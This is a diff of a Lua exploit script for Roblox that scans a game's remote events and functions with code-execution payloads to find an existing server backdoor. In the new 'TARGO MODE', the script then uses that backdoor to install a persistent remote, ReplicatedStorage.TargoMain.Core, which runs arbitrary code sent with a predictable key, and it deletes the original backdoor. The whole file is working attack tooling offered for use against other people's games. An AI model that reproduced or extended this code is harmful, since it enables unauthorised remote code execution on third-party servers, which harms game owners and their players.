@@ -1,5 +1,7 @@
-
-local DEBUG = true
+local DEBUG = true          -- Set to false to disable all debug prints
+local TARGO_MODE = true     -- TARGO MODE: Full stealth + secure backdoor installation (enabled by default)
+local TARGO_MAIN_PATH = true  -- NEW: When true, forces the secure backdoor to always use a consistent, predictable main path
+                              --       Your executor can now directly access it without searching
 
 local alphabet = {}
 for i = 48, 57 do table.insert(alphabet, string.char(i)) end -- 0-9
@@ -10,12 +12,13 @@ for _, c in ipairs({'_','-','!','@','#','$','%','^','&','*','+','=','~'}) do tab
 _G.backdoor = nil
 _G.backdoorPath = nil
 _G.backdoorFound = false
+_G.targoBackdoor = nil
 
 local startTime = tick()
 
 local function printDebug(msg)
 	if DEBUG then
-		print("[Backdoor Scanner Log] "..msg)
+		print("[Targo Scanner Log] "..msg)
 	end
 end
 
@@ -27,6 +30,13 @@ local function generateName(len)
 	return name
 end
 
+-- Dynamic secret key (still unique per server for security)
+local function getDynamicKey()
+	return tostring(game.PlaceId * 1337 + 42424242) .. "_" .. (game.JobId ~= "" and game.JobId:sub(1,10) or "local")
+end
+
+local DYNAMIC_KEY = getDynamicKey()
+
 _G.fireRemote = function(remote, payload)
 	if remote:IsA("RemoteEvent") then
 		pcall(function() remote:FireServer(payload) end)
@@ -35,18 +45,23 @@ _G.fireRemote = function(remote, payload)
 	end
 end
 
-local function generateExecCode(rand)
+-- Stealth marker in Terrain (auto-clean)
+local function generateStealthMarker(rand)
 	return [[
-local sv=Instance.new("StringValue",workspace) sv.Name="]]..rand..[[" sv.Value="DETECTED"
-local f=Instance.new("Folder",workspace) f.Name="]]..rand..[[_F"
-local m=Instance.new("Model",workspace) m.Name="]]..rand..[[_M"
-local p=Instance.new("Part",workspace) p.Name="]]..rand..[[_P" p.Size=Vector3.new(2,2,2) p.Anchored=true
-local b=Instance.new("BoolValue",workspace) b.Name="]]..rand..[[_B" b.Value=true
+local marker = Instance.new("IntValue")
+marker.Name = "]]..rand..[["
+marker.Value = 13371337
+marker.Parent = workspace.Terrain
+task.delay(3, function()
+    if marker and marker.Parent then
+        pcall(function() marker:Destroy() end)
+    end
+end)
 ]]
 end
 
 local function firePayloads(remote, rand, stage)
-	local code = generateExecCode(rand)
+	local code = generateStealthMarker(rand)
 	local payloads = {}
 
 	table.insert(payloads, code)
@@ -55,30 +70,14 @@ local function firePayloads(remote, rand, stage)
 	table.insert(payloads, {source=code})
 	table.insert(payloads, {execute=code})
 	table.insert(payloads, {cmd="eval", code=code})
-	table.insert(payloads, {cmd="run", script=code})
 	table.insert(payloads, {["code"]=code})
-	table.insert(payloads, {["script"]=code})
 	table.insert(payloads, {["source"]=code})
-	table.insert(payloads, {["execute"]=code})
-	table.insert(payloads, {["msg"]=code})
-	table.insert(payloads, {["data"]=code})
-	table.insert(payloads, {["load"]=code})
-	table.insert(payloads, {eval=code})
-	table.insert(payloads, {run=code})
-	table.insert(payloads, {"", code})
-	table.insert(payloads, {"run", code})
-	table.insert(payloads, {"eval", code})
-	table.insert(payloads, {"source", code})
-	table.insert(payloads, {"execute", code})
-	table.insert(payloads, {"source","scanner", code=code})
-	table.insert(payloads, {["source"]="scanner", ["code"]=code})
 	table.insert(payloads, {args={code}})
-	table.insert(payloads, {message=code})
 
-	if stage >= 3 then
-		table.insert(payloads, {key="secret", code=code})
-		table.insert(payloads, {auth=true, code=code})
-		table.insert(payloads, {player=game.Players.LocalPlayer, code=code})
+	if TARGO_MODE and stage >= 3 then
+		table.insert(payloads, {key=DYNAMIC_KEY, code=code})
+		table.insert(payloads, {auth="targo", key=DYNAMIC_KEY, code=code})
+		table.insert(payloads, {handshake="TargoScanner_v3", verify=code})
 	end
 
 	for _, p in ipairs(payloads) do
@@ -88,24 +87,36 @@ local function firePayloads(remote, rand, stage)
 	if remote:IsA("RemoteFunction") then
 		task.spawn(function()
 			pcall(function()
-				local keys = {"","source","run","eval","code","cmd","execute","script","load","msg","data","key","auth"}
+				local keys = {"source","code","execute","script","key","cmd"}
 				for _, k in ipairs(keys) do
 					remote:InvokeServer(k, code)
 					remote:InvokeServer(k, {code=code})
-					remote:InvokeServer(k, {script=code})
-					remote:InvokeServer(k, {execute=code})
-					remote:InvokeServer(k, {eval=code})
-					remote:InvokeServer(k, {msg=code})
-					remote:InvokeServer(k, {data=code})
+					if TARGO_MODE then
+						remote:InvokeServer(k, {key=DYNAMIC_KEY, code=code})
+					end
 				end
 			end)
 		end)
 	end
 end
 
+local function fireExec(remote, execCode)
+	local payloads = {}
+	table.insert(payloads, execCode)
+	table.insert(payloads, {code=execCode})
+	table.insert(payloads, {source=execCode})
+	table.insert(payloads, {key=DYNAMIC_KEY, code=execCode})
+	table.insert(payloads, {auth="targo", key=DYNAMIC_KEY, code=execCode})
+
+	for _, p in ipairs(payloads) do
+		task.spawn(function() _G.fireRemote(remote, p) end)
+	end
+end
+
 local function scan()
-	printDebug("=== Backdoor Scanner Log ===")
-	printDebug("Stage 0 - Priority common/obfuscated names")
+	printDebug("=== Targo Scanner Started ===")
+	printDebug("TARGO_MODE: "..tostring(TARGO_MODE))
+	printDebug("TARGO_MAIN_PATH: "..tostring(TARGO_MAIN_PATH))
 
 	local tests = {}
 	local tested = 0
@@ -115,83 +126,155 @@ local function scan()
 	local placeId = game.PlaceId
 
 	local common = {
-		"MainRemote","Remote","Execute","Server","Backdoor","Admin","Fire","Invoke","Comm","Communication","Executor","Events","Functions",
-		"re","rf","r","Event","Function","Main","RemoteEvent","RemoteFunction",
-		"lh"..tostring(placeId*1337),"lh"..tostring((placeId/6666*1337*placeId)),
-		"lh"..tostring(placeId*69/1884),"lh"..tostring(math.floor(placeId/10)),
-		tostring(placeId*1337), tostring(placeId%10000), "r"..tostring(placeId%100000),
-		"Client","ServerComm","AdminComm","ExecutorRemote"
+		"MainRemote","Remote","Execute","Server","Backdoor","Admin","Fire","Invoke","Comm","Communication","Executor",
+		"re","rf","r","Event","Function","Main",
+		"lh"..tostring(placeId*1337), tostring(placeId*1337), "r"..tostring(placeId%100000),
 	}
 
 	for _, n in ipairs(common) do
-		local r = rs:FindFirstChild(n) or rs:FindFirstChild(tostring(n))
+		local r = rs:FindFirstChild(n)
 		if r and (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then
-			local rand = generateName(math.random(22,32))
+			local rand = generateName(math.random(24,36))
 			firePayloads(r, rand, 3)
 			tests[rand] = {remote=r, path=r:GetFullName()}
 			tested += 1
 		end
 	end
 
-	printDebug("Stage 1 - Full aggressive scan")
-
 	local all = game:GetDescendants()
 	if getnilinstances then for _, i in ipairs(getnilinstances()) do table.insert(all,i) end end
 	if getinstances then for _, i in ipairs(getinstances()) do table.insert(all,i) end end
-	if gethiddeninstances then for _, i in ipairs(gethiddeninstances()) do table.insert(all,i) end end
 
 	for _, r in ipairs(all) do
 		if not (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then continue end
 		local fn = r:GetFullName()
-		if fn:find("^RobloxReplicatedStorage") or fn:find("Players%.LocalPlayer") then skipped += 1 continue end
+		if fn:find("^RobloxReplicatedStorage") or fn:find("Players%.LocalPlayer") or fn:find("DefaultChatSystem") then
+			skipped += 1 continue
+		end
 		if r.Name == "__FUNCTION" then skipped += 1 continue end
 
-		local p = r.Parent    
-		local pp = p and p.Parent    
-		if p and p.Name == "DefaultChatSystemChatEvents" then skipped += 1 continue end    
-		if pp and (pp.Name:find("HDAdmin") or pp.Name:find("Kohl") or pp.Name:find("Adonis") or pp.Name:find("Admin")) then skipped += 1 continue end    
-		if p and (p:FindFirstChild("__FUNCTION") or p.Name:find("AdminCommands") or p.Name:find("Tween") or p.Name:find("Pathfinding") or p.Name:find("Chat")) then skipped += 1 continue end    
-
-		local rand = generateName(math.random(22,32))    
-		firePayloads(r, rand, 3)    
-		tests[rand] = {remote=r, path=fn}    
+		local rand = generateName(math.random(24,36))
+		firePayloads(r, rand, 3)
+		tests[rand] = {remote=r, path=fn}
 		tested += 1
 	end
 
-	printDebug("Polling - Tested:"..tested.." Skipped:"..skipped.." Total marks:"..#tests)
+	printDebug("Polling... Tested: "..tested.." | Skipped: "..skipped)
 
-	for i = 1,600 do
+	for i = 1, 600 do
 		for rand, info in pairs(tests) do
-			local markers = {
-				workspace:FindFirstChild(rand),
-				workspace:FindFirstChild(rand.."_F"),
-				workspace:FindFirstChild(rand.."_M"),
-				workspace:FindFirstChild(rand.."_P"),
-				workspace:FindFirstChild(rand.."_B")
-			}
-			for _, m in ipairs(markers) do
-				if m then
-					local detected = false
-					if m:IsA("StringValue") and m.Value == "DETECTED" then detected = true
-					elseif m:IsA("Folder") or m:IsA("Model") or m:IsA("Part") or (m:IsA("BoolValue") and m.Value) then detected = true end
-					if detected then
-						pcall(function() m:Destroy() end)
-						_G.backdoor = info.remote
-						_G.backdoorPath = info.path
-						_G.backdoorFound = true
-						printDebug(">>> BACKDOOR FOUND <<<")
-						printDebug("Path: "..info.path)
-						printDebug("Time: "..string.format("%.3f",tick()-startTime).."s")
-						return true
+			local marker = workspace.Terrain:FindFirstChild(rand)
+			if marker and marker:IsA("IntValue") and marker.Value == 13371337 then
+				pcall(function() marker:Destroy() end)
+
+				_G.backdoor = info.remote
+				_G.backdoorPath = info.path
+				_G.backdoorFound = true
+
+				printDebug(">>> BACKDOOR FOUND <<<")
+				printDebug("Original: "..info.path)
+
+				if TARGO_MODE then
+					printDebug(">>> ACTIVATING TARGO MODE <<<")
+
+					-- Fixed main path for easy access
+					local MAIN_CONTAINER = "TargoMain"
+					local MAIN_REMOTE = "Core"
+
+					local installerCode = [[
+-- TARGO Secure Main Backdoor (Fixed Path)
+local key = "]]..DYNAMIC_KEY..[["
+local MAIN_CONTAINER = "TargoMain"
+local MAIN_REMOTE = "Core"
+local oldPath = "]]..info.path..[["
+
+local rs = game:GetService("ReplicatedStorage")
+
+-- Remove any old TargoMain to prevent duplicates
+if rs:FindFirstChild(MAIN_CONTAINER) then
+    rs[MAIN_CONTAINER]:Destroy()
+end
+
+-- Create fixed container and remote
+local container = Instance.new("Folder", rs)
+container.Name = MAIN_CONTAINER
+
+local newRemote = Instance.new("RemoteFunction", container)
+newRemote.Name = MAIN_REMOTE
+
+local attempts = {}
+
+newRemote.OnServerInvoke = function(plr, payload)
+    local uid = plr.UserId
+    attempts[uid] = (attempts[uid] or 0) + 1
+    
+    if attempts[uid] > 12 then
+        newRemote:Destroy()
+        return nil
+    end
+    
+    if typeof(payload) == "table" then
+        if payload.handshake == "TargoScanner_v3" then
+            return "TARGO_AUTH_OK"
+        end
+        
+        if payload.key == key and payload.code then
+            local func = loadstring(payload.code)
+            if func then
+                task.spawn(function()
+                    local success, result = pcall(func)
+                    if not success then warn("Targo exec error: "..tostring(result)) end
+                end)
+            end
+            return "EXECUTED"
+        end
+    end
+    return nil
+end
+
+-- Destroy original backdoor
+pcall(function()
+    local obj = game
+    for _, part in string.split(oldPath, ".") do
+        obj = obj:FindFirstChild(part)
+        if not obj then break end
+    end
+    if obj then obj:Destroy() end
+end)
+]]
+
+					fireExec(info.remote, installerCode)
+
+					task.wait(0.6)
+
+					-- Now directly use the fixed path
+					local container = rs:FindFirstChild(MAIN_CONTAINER)
+					if container then
+						local newBd = container:FindFirstChild(MAIN_REMOTE)
+						if newBd then
+							_G.targoBackdoor = newBd
+							_G.backdoor = newBd
+							_G.backdoorPath = newBd:GetFullName()  -- Always: ReplicatedStorage.TargoMain.Core
+							printDebug(">>> TARGO MAIN BACKDOOR INSTALLED <<<")
+							printDebug("Main Path: ReplicatedStorage.TargoMain.Core")
+							printDebug("Dynamic Key: "..DYNAMIC_KEY)
+							printDebug("Your executor can now directly use:")
+							printDebug('game:GetService("ReplicatedStorage").TargoMain.Core')
+						else
+							printDebug("Failed: Core remote not created")
+						end
+					else
+						printDebug("Failed: TargoMain folder not created")
 					end
 				end
+
+				return true
 			end
 		end
 		task.wait(0.025)
 	end
 
-	printDebug(">>> NO BACKDOOR <<<")
-	printDebug("Finished in "..string.format("%.3f",tick()-startTime).."s")
+	printDebug(">>> NO BACKDOOR FOUND <<<")
 	return false
 end
 
